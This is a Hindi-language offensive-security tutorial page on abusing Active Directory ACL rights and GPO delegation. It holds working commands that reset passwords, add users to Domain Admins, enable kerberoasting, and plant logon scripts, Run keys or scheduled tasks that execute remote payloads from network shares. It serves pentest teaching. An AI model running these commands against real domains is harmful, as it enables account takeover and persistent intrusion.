# Active Directory ACLs/ACEs का दुरुपयोग

{{#include ../../../banners/hacktricks-training.md}}

**यह पृष्ठ मुख्य रूप से इन तकनीकों का सारांश है:** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **और** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**। अधिक विवरण के लिए मूल लेख देखें।**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **User पर GenericAll अधिकार**

यह विशेषाधिकार attacker को लक्ष्य user account पर पूर्ण नियंत्रण देता है। एक बार `GenericAll` अधिकार `Get-ObjectAcl` कमांड से पुष्टि हो जाने पर, attacker कर सकता है:

- **Change the Target's Password**: `net user <username> <password> /domain` का उपयोग करके attacker यूज़र का पासवर्ड रीसेट कर सकता है।
- **Targeted Kerberoasting**: यूज़र के खाते को SPN असाइन करके उसे kerberoastable बनाएं, फिर Rubeus और targetedKerberoast.py का उपयोग करके ticket-granting ticket (TGT) हेशेस निकालें और उन्हें क्रैक करने का प्रयास करें।
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: उपयोगकर्ता के लिए pre-authentication अक्षम करें, जिससे उनका खाता ASREPRoasting के प्रति संवेदनशील हो जाए।
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll अधिकार समूह पर**

यह विशेषाधिकार attacker को समूह की सदस्यताओं को बदलने की अनुमति देता है यदि उनके पास किसी समूह जैसे `Domain Admins` पर `GenericAll` अधिकार हैं। `Get-NetGroup` से समूह का distinguished name पहचानने के बाद, attacker कर सकता है:

- **Domain Admins Group में खुद को जोड़ना**: इसे सीधे commands के माध्यम से या Active Directory या PowerSploit जैसे modules का उपयोग करके किया जा सकता है।
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
Linux से आप BloodyAD का उपयोग करके किसी भी समूह में खुद को जोड़ सकते हैं जब आपके पास उन पर GenericAll/Write membership हो। यदि लक्षित समूह “Remote Management Users” में nested है, तो आप उन hosts पर जो उस समूह का सम्मान करते हैं तुरंत WinRM access प्राप्त कर लेंगे:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

किसी computer object या user account पर ये privileges होने से निम्न संभव होते हैं:

- **Kerberos Resource-based Constrained Delegation**: एक computer object को हथियाने की अनुमति देता है।
- **Shadow Credentials**: इन privileges का फायदा उठाकर shadow credentials बनाने के जरिए किसी computer या user account की नकल करने के लिए इस technique का उपयोग किया जा सकता है।

## **WriteProperty on Group**

यदि किसी user के पास किसी विशेष group (उदा., `Domain Admins`) के सभी objects पर `WriteProperty` rights हैं, तो वे:

- **Add Themselves to the Domain Admins Group**: `net user` और `Add-NetGroupUser` commands को मिलाकर हासिल किया जा सकता है; यह method domain के भीतर privilege escalation की अनुमति देती है।
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **समूह पर Self (Self-Membership)**

यह अधिकार हमलावरों को विशिष्ट समूहों, जैसे `Domain Admins`, में खुद को जोड़ने की अनुमति देता है, उन कमांड्स के माध्यम से जो समूह सदस्यता को सीधे बदलते हैं। निम्नलिखित कमांड अनुक्रम का उपयोग करके खुद को जोड़ना संभव है:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

यह एक समान privilege है — यदि किसी के पास उन समूहों पर `WriteProperty` अधिकार है तो वह समूह की properties बदलकर स्वयं को समूहों में सीधे जोड़ सकता है। इस privilege की पुष्टि और निष्पादन निम्न के साथ किए जाते हैं:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

किसी उपयोगकर्ता पर `User-Force-Change-Password` के लिए `ExtendedRight` होने से वर्तमान पासवर्ड जाने बिना पासवर्ड रीसेट करने की अनुमति मिलती है। इस अधिकार की सत्यापन और इसका शोषण PowerShell या वैकल्पिक कमांड-लाइन टूल्स के माध्यम से किया जा सकता है, जो उपयोगकर्ता के पासवर्ड को रीसेट करने के कई तरीके प्रदान करते हैं — interactive sessions और non-interactive environments के लिए one-liners सहित। कमांड सरल PowerShell invocations से लेकर Linux पर `rpcclient` के उपयोग तक होते हैं, जो attack vectors की बहुमुखी प्रतिभा प्रदर्शित करते हैं।
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **समूह पर WriteOwner**

यदि किसी हमलावर को किसी समूह पर `WriteOwner` अधिकार मिलते हैं, तो वे उस समूह का स्वामित्व खुद पर बदल सकते हैं। यह विशेष रूप से तब प्रभावशाली होता है जब संबंधित समूह `Domain Admins` हो, क्योंकि स्वामित्व बदलने से समूह की विशेषताओं और सदस्यता पर व्यापक नियंत्रण मिल जाता है। प्रक्रया में सही ऑब्जेक्ट की पहचान `Get-ObjectAcl` के द्वारा करना और फिर मालिक को SID या नाम के जरिए बदलने के लिए `Set-DomainObjectOwner` का उपयोग करना शामिल है।
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

यह अनुमति हमलावर को उपयोगकर्ता गुणों को संशोधित करने की अनुमति देती है। विशेष रूप से, `GenericWrite` एक्सेस के साथ, हमलावर किसी उपयोगकर्ता के लॉगऑन स्क्रिप्ट पाथ को बदल सकता है ताकि उपयोगकर्ता लॉगऑन पर एक हानिकारक स्क्रिप्ट निष्पादित हो। यह `Set-ADObject` कमांड का उपयोग करके हासिल किया जाता है, जो लक्षित उपयोगकर्ता के `scriptpath` प्रॉपर्टी को हमलावर की स्क्रिप्ट की ओर निर्देशित करने के लिए अपडेट करता है।
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

इस privilege के साथ, attackers group membership को बदल सकते हैं — उदाहरण के तौर पर वे खुद को या अन्य users को specific groups में जोड़ सकते हैं।  

इस प्रक्रिया में एक credential object बनाना शामिल है, उसे group में users को जोड़ने या हटाने के लिए उपयोग करना, और membership में हुए बदलावों को PowerShell commands से सत्यापित करना।
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

AD object का मालिक होना और उस पर `WriteDACL` privileges होना एक attacker को उस object पर खुद को `GenericAll` privileges दे पाने में सक्षम बनाता है। यह ADSI manipulation के माध्यम से किया जाता है, जिससे object पर पूरा control मिलता है और इसके group memberships को modify करने की क्षमता मिलती है। इसके बावजूद, Active Directory module के `Set-Acl` / `Get-Acl` cmdlets का इस्तेमाल करके इन privileges का exploit करने में सीमाएँ मौजूद हैं।
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **डोमेन पर प्रतिकरण (DCSync)**

DCSync attack डोमेन पर विशिष्ट प्रतिकरण अनुमतियों का उपयोग करके एक Domain Controller की नकल करता है और डेटा, जिसमें user credentials शामिल हैं, सिंक्रोनाइज़ करता है। यह शक्तिशाली तकनीक `DS-Replication-Get-Changes` जैसी permissions की आवश्यकता करती है, जो attackers को AD वातावरण से संवेदनशील जानकारी सीधे Domain Controller तक पहुँच के बिना निकालने की अनुमति देती है। [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects (GPOs) को प्रबंधित करने के लिए delegated access गंभीर सुरक्षा जोखिम पैदा कर सकता है। उदाहरण के लिए, अगर किसी उपयोगकर्ता जैसे `offense\spotless` को GPO प्रबंधन अधिकार delegated किए गए हैं, तो उसे **WriteProperty**, **WriteDacl**, और **WriteOwner** जैसी privileges मिल सकती हैं। इन permissions का दुरुपयोग malicious उद्देश्यों के लिए किया जा सकता है, जैसा कि PowerView का उपयोग कर पहचाना जा सकता है: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO अनुमतियाँ सूचीबद्ध करें

गलत कॉन्फ़िगर किए गए GPOs की पहचान करने के लिए, PowerSploit के cmdlets को chained किया जा सकता है। इससे उन GPOs की खोज होती है जिन्हें किसी विशिष्ट उपयोगकर्ता के पास manage करने की permissions हैं: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: यह पता लगाना संभव है कि कोई विशिष्ट GPO किन कंप्यूटरों पर लागू है, जिससे संभावित प्रभाव का दायरा समझने में मदद मिलती है। `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: किसी विशेष कंप्यूटर पर कौन-सी policies लागू हैं देखने के लिए, `Get-DomainGPO` जैसे commands का उपयोग किया जा सकता है।

**OUs with a Given Policy Applied**: किसी दिए गए policy से प्रभावित organizational units (OUs) की पहचान `Get-DomainOU` का उपयोग करके की जा सकती है।

आप [**GPOHound**](https://github.com/cogiceo/GPOHound) टूल का उपयोग करके GPOs सूचीबद्ध कर सकते हैं और उनमें समस्याएँ ढूँढ सकते हैं।

### GPO का दुरुपयोग - New-GPOImmediateTask

गलत कॉन्फ़िगर किए गए GPOs का exploit करके कोड execute कराया जा सकता है — उदाहरण के तौर पर एक immediate scheduled task बनाकर। इससे प्रभावित मशीनों पर किसी user को local administrators group में जोड़ा जा सकता है, जो privileges को काफी बढ़ा देता है:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

यदि GroupPolicy module इंस्टॉल है, तो यह नए GPOs बनाने और लिंक करने, तथा प्रभावित कंप्यूटरों पर backdoors चलाने के लिए registry values जैसी preferences सेट करने की अनुमति देता है। यह तरीका निष्पादन के लिए GPO के अपडेट होने और एक user के कंप्यूटर में लॉगिन करने पर निर्भर करता है:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse मौजूदा GPOs का दुरुपयोग करने का एक तरीका प्रदान करता है, जैसे कि टास्क जोड़कर या सेटिंग्स बदलकर — नए GPOs बनाने की आवश्यकता के बिना। यह टूल परिवर्तनों को लागू करने से पहले मौजूदा GPOs में संशोधन या नए GPOs बनाने के लिए RSAT tools के उपयोग की आवश्यकता रखता है:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

GPO अपडेट सामान्यतः लगभग हर 90 मिनट में होते हैं। इस प्रक्रिया को तेज करने के लिए, विशेषकर किसी बदलाव के बाद, लक्षित कंप्यूटर पर `gpupdate /force` कमांड का उपयोग करके तत्काल नीति अपडेट लागू कराया जा सकता है। यह कमांड सुनिश्चित करता है कि GPOs में किए गए किसी भी संशोधन को अगले स्वचालित अपडेट चक्र का इंतजार किए बिना लागू किया जा सके।

### आंतरिक विवरण

किसी दिए गए GPO के Scheduled Tasks की जाँच करने पर, जैसे कि `Misconfigured Policy`, यह पुष्टि की जा सकती है कि `evilTask` जैसे कार्य जोड़े गए हैं। ये कार्य स्क्रिप्ट्स या कमांड-लाइन टूल्स के माध्यम से बनाए जाते हैं जिनका उद्देश्य सिस्टम के व्यवहार में बदलाव करना या privileges बढ़ाना होता है।

टास्क की संरचना, जो `New-GPOImmediateTask` द्वारा जनरेट की गई XML कॉन्फ़िगरेशन फ़ाइल में दिखती है, अनुसूचित कार्य के विशिष्ट विवरणों को रेखांकित करती है — जिसमें निष्पादित किए जाने वाले कमांड और उनके ट्रिगर्स शामिल हैं। यह फ़ाइल दर्शाती है कि GPOs के भीतर scheduled tasks कैसे परिभाषित और प्रबंधित होते हैं, और नीति लागू करने के हिस्से के रूप में arbitrary commands या scripts को निष्पादित करने का एक तरीका प्रदान करती है।

### उपयोगकर्ता और समूह

GPOs लक्षित सिस्टम पर उपयोगकर्ता और समूह सदस्यताओं के हेरफेर की अनुमति भी देते हैं। Users and Groups नीति फ़ाइलों को सीधे संपादित करके, हमलावर उपयोगकर्ताओं को विशेषाधिकार प्राप्त समूहों में जोड़ सकते हैं, जैसे कि स्थानीय `administrators` समूह। यह GPO प्रबंधन अनुमतियों के delegation के माध्यम से संभव होता है, जो नीति फ़ाइलों में नए उपयोगकर्ता जोड़ने या समूह सदस्यताओं को बदलने की अनुमति देता है।

Users and Groups के लिए XML कॉन्फ़िगरेशन फ़ाइल यह दर्शाती है कि ये बदलाव कैसे लागू किए जाते हैं। इस फ़ाइल में प्रविष्टियाँ जोड़कर, विशिष्ट उपयोगकर्ताओं को प्रभावित प्रणालियों में बढ़े हुए विशेषाधिकार दिए जा सकते हैं। यह विधि GPO हेरफेर के माध्यम से privilege escalation का एक सीधा तरीका प्रदान करती है।

इसके अलावा, कोड निष्पादित करने या persistence बनाए रखने के अतिरिक्त तरीके भी हैं, जैसे logon/logoff scripts का उपयोग, autoruns के लिए registry keys में बदलाव, .msi फ़ाइलों के माध्यम से सॉफ़्टवेयर इंस्टॉल करना, या service configurations को संपादित करना। ये तकनीकें GPOs के दुरुपयोग के माध्यम से पहुंच बनाए रखने और लक्षित प्रणालियों को नियंत्रित करने के विभिन्न रास्ते प्रदान करती हैं।

## संदर्भ

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
